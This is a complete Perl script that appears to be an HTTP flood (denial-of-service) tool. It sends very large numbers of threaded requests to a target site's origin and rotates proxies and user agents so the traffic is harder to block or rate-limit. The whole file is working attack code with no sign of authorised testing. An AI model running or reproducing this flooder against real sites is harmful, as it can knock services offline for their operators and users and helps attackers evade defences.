#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use threads;
use Thread::Queue;
use List::Util qw(shuffle);
use Getopt::Long;
use URI;

my $origin_domain = '';
my $url_path = '/';
my $num_threads = '';
my $num_requests = '';
my $bypass_method = '';
my $rate_limit = '';
my $timeout = '';
my $proxy_list_file = 'proxies.txt';
my $user_agent_file = 'user.txt';
my @proxy_list;
my @user_agents;

GetOptions(
    "url=s"         => \$origin_domain,
    "urlpath=s"     => \$url_path,
    "threads=i"     => \$num_threads,
    "num_requests=i"=> \$num_requests,
    "method=s"      => \$bypass_method,
    "rate_limit=f"  => \$rate_limit,
    "timeout=i"     => \$timeout,
    "proxy_list=s"  => \$proxy_list_file,
    "user_agents=s" => \$user_agent_file,
);

if (!$origin_domain) {
    die "Usage: perl $0 --url <origin_domain> [--urlpath /] [--threads 30] [--num_requests 1000000] [--method GET] [--rate_limit 10] [--timeout 10] [--proxy_list proxies.txt] [--user_agents user.txt]\n";
}

# Read proxy list from file
if (-e $proxy_list_file) {
    open(my $fh, '<', $proxy_list_file) or die "Could not open proxy list file '$proxy_list_file': $!";
    @proxy_list = <$fh>;
    chomp(@proxy_list);
    close($fh);
} else {
    warn "Proxy list file '$proxy_list_file' not found. Running without proxies.\n";
}

# Read user agent list from file
if (-e $user_agent_file) {
    open(my $fh, '<', $user_agent_file) or die "Could not open user agent file '$user_agent_file': $!";
    @user_agents = <$fh>;
    chomp(@user_agents);
    close($fh);
} else {
    warn "User agent file '$user_agent_file' not found. Running with default user agent.\n";
    push @user_agents, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36';
}

my $request_queue = Thread::Queue->new();

my @threads = map {
    threads->create(sub {
        my $ua = LWP::UserAgent->new;
        $ua->timeout($timeout);

        while (my $request_number = $request_queue->dequeue()) {
            my $proxy_string = $proxy_list[rand @proxy_list] if @proxy_list;
            my $user_agent = $user_agents[rand @user_agents];

            my $proxy_uri = URI->new("http://$proxy_string") if $proxy_string;
            $ua->proxy(['http', 'https'], $proxy_uri->as_string) if $proxy_uri;

            $ua->agent($user_agent);

            my $request = HTTP::Request->new($bypass_method => "$origin_domain$url_path");

                # Set the necessary headers
                $request->header('Accept-Encoding' => 'gzip, deflate, br');
                $request->header('Accept-Language' => 'en-US,en;q=0.9');
                $request->header('Connection' => 'keep-alive');
                $request->header('Referer' => "$origin_domain");
                $request->header('User-Agent' => $user_agent);

                 my $response = $ua->request($request);

            if ($response->is_success) {
                print "Thread " . threads->tid() . " - Request $request_number: Success\n";
            } else {
                print "Thread " . threads->tid() . " - Request $request_number: Failed - " . $response->status_line . "\n";
            }

            if ($rate_limit > 0) {
                sleep(1 / $rate_limit);
            }
        }
    });
} 1 .. $num_threads;

for (1 .. $num_threads * $num_requests) {
    $request_queue->enqueue($_);
}

$request_queue->end();
$_->join() for @threads;

print "All requests completed.\n";
